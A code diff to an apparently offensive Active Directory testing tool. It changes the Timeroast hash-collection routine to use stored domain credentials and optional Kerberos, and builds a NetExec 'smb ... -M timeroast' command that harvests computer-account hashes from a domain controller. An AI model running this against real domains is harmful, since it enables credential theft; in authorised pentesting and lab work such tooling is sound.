@@ -78,6 +78,10 @@ class TimeroastShell(Protocol):
         **kwargs: object,
     ) -> Any: ...
 
+    def build_auth_nxc(
+        self, username: str, password: str, domain: str, kerberos: bool = True
+    ) -> str: ...
+
     def _get_lab_slug(self) -> str | None: ...
 
     def run_command(
@@ -121,6 +125,8 @@ class TimeroastShell(Protocol):
     def _sync_clock_via_net_time(
         self, host: str, *, domain: str | None = None
     ) -> bool: ...
+
+    def do_sync_clock_with_pdc(self, domain: str, verbose: bool = False) -> bool: ...
 
 
 @dataclass(frozen=True, slots=True)
@@ -557,6 +563,32 @@ def _collect_timeroast_hashes(
         marked_domain = mark_sensitive(domain, "domain")
         print_error(f"PDC is not configured for {marked_domain}.")
         return None
+    domain_creds = shell.domains_data.get(domain, {})
+    username = str(domain_creds.get("username") or "").strip()
+    password = str(domain_creds.get("password") or "").strip()
+    if not username or not password:
+        marked_domain = mark_sensitive(domain, "domain")
+        print_error(
+            f"Missing credentials for {marked_domain}. Timeroast requires authenticated SMB access."
+        )
+        return None
+
+    pdc_target = pdc
+    use_kerberos = False
+    if hasattr(shell, "do_sync_clock_with_pdc"):
+        try:
+            use_kerberos = bool(shell.do_sync_clock_with_pdc(domain, verbose=True))
+        except Exception as exc:
+            telemetry.capture_exception(exc)
+            print_info_debug(
+                f"[timeroast] kerberos clock sync precheck failed for "
+                f"{mark_sensitive(domain, 'domain')}: {exc}"
+            )
+            use_kerberos = False
+    pdc_hostname = str(domain_creds.get("pdc_hostname") or "").strip()
+    if use_kerberos and pdc_hostname:
+        pdc_target = f"{pdc_hostname}.{domain}"
+    auth = shell.build_auth_nxc(username, password, domain, kerberos=use_kerberos)
 
     paths = _build_timeroast_paths(shell, domain)
     os.makedirs(os.path.dirname(paths["log_abs"]), exist_ok=True)
@@ -573,8 +605,8 @@ def _collect_timeroast_hashes(
     )
 
     command = (
-        f"{shlex.quote(shell.netexec_path)} smb {shlex.quote(pdc)} "
-        f"-u '' -p '' -M timeroast --log {shlex.quote(paths['log_abs'])}"
+        f"{shlex.quote(shell.netexec_path)} smb {shlex.quote(pdc_target)} "
+        f"{auth} -M timeroast --log {shlex.quote(paths['log_abs'])}"
     )
     print_info_debug(f"[timeroast] command: {command}")
 
